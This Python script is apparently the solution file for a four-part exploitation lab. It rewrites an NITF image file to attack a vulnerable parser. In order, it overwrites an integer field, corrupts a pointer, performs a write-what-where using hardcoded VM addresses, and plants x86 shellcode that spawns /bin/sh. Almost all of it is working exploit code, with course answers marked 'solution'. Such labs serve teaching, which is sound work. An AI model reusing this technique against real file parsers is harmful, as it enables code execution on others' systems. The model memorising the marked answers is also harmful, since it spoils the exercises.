#!/usr/bin/env python3
from pathlib import Path
import sys

# Parameters for file i/o
FILESTART = 0x16b # solution

def lab1_numi(raw_file, outputFile="lab1.nitf"):
    # LAB 1: TODO input hex values from gdb for your VM
    sBuffer_addr = 0x565767e0
    numi_addr = 0x56576e84

    difference = numi_addr - sBuffer_addr
    offset = FILESTART + difference

    # Overwrite with positive integer
    numi  = b'\x41\x41\x41\x00'

    print("numi Before: ", raw_file[offset:offset+len(numi)])

    raw_file[offset:offset+len(numi)]=numi
    print("numi After: ", raw_file[offset:offset+len(numi)])

    # persist our changes to a new file and return for next step.
    with open(outputFile,'wb') as f:
        f.write(raw_file)
        f.close()
    return raw_file

def lab2_where(raw_file, outputFile="lab2.nitf"):
    # LAB 2: TODO input hex values from gdb for your VM
    sBuffer_addr = 0x565767e0
    image_info_addr = 0x56576ea4

    difference = image_info_addr - sBuffer_addr
    offset = FILESTART + difference

    # Where would you like to overwrite?
    where_ptr  = b'\x90\x60\x57\x56' #little-endian 0x56576090

    print("before: ",raw_file[offset:offset+len(where_ptr)])

    raw_file[offset:offset+len(where_ptr)]=where_ptr
    print("after: ",raw_file[offset:offset+len(where_ptr)])

    # persist our changes to a new file and return for next step.
    with open(outputFile,'wb') as f:
        f.write(raw_file)
        f.close()
    return raw_file


def lab3_what_where(raw_file, outputFile="lab3.nitf"):
    sBuffer_addr = 0x565767e0
    image_info_addr = 0x56576ea4

    difference = image_info_addr - sBuffer_addr
    offset = FILESTART + difference

    # Where would you like to overwrite?
    # Adjust this to account for offset of length_of_data in image_info struct
    where_ptr  = b'\x88\x60\x57\x56' #little-endian
    print("before: ",raw_file[offset:offset+len(where_ptr)])

    raw_file[offset:offset+len(where_ptr)]=where_ptr
    print("after: ",raw_file[offset:offset+len(where_ptr)])

    offset = FILESTART + 6 #skip first six bytes to target larger 10-byte strncpy

    # What would you like to write? Remember it has to be ascii-encoded int.
    # deb11 solution
    what_str = '1448568836' #ascii-encoded int for $(sBuffer+0x24)
    what_value  = b'\x31\x34\x34\x38\x35\x36\x38\x38\x33\x36'

    print("before: ",raw_file[offset:offset+len(what_value)])

    raw_file[offset:offset+len(what_value)]=what_value
    print("after: ",raw_file[offset:offset+len(what_value)])

    # persist our changes to a new file and return for next step.
    with open(outputFile,'wb') as f:
        f.write(raw_file)
        f.close()
    return raw_file


def lab4_shellcode(raw_file, outputFile="lab4.nitf"):
    sBuffer_addr = 0x565767e0
    what_int_str = '1448568836' #ascii-encoded int for $(sBuffer+0x24)

    shell_code_offset = int(what_int_str)-sBuffer_addr

    offset = FILESTART + shell_code_offset

    # solution https://shell-storm.org/shellcode/files/shellcode-841.html
    shellcode = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

    print("before: ",raw_file[offset:offset+len(shellcode)])
    raw_file[offset:offset+len(shellcode)]=shellcode
    print("after: ",raw_file[offset:offset+len(shellcode)])

    # persist our changes to a new file and return for next step.
    with open(outputFile,'wb') as f:
        f.write(raw_file)
        f.close()
    return raw_file


def main():
    usage = 'usage: rewrite_nitf.py <inputfile>'
    example = '/labs/rewrite_nitf.py /mayhem/defects/5315fb378c56843434354a742b47e0c42fb8f7f82cde45c2156acbe7a7bd3a66'

    if len(sys.argv)<2:
        print(usage)
        exit

    if  sys.argv[1] and Path(sys.argv[1]).is_file:
        inputFile = sys.argv[1]
        with open(inputFile, "rb") as f:
            raw_file=bytearray(f.read())
            print(f"Read {len(raw_file)} bytes." )

            raw_file = lab1_numi(raw_file)
            raw_file = lab2_where(raw_file)
            raw_file = lab3_what_where(raw_file)
            raw_file = lab4_shellcode(raw_file)

    else:
        print("Unable to open file. Check your paths.")
        exit

if __name__ == "__main__":
   main()
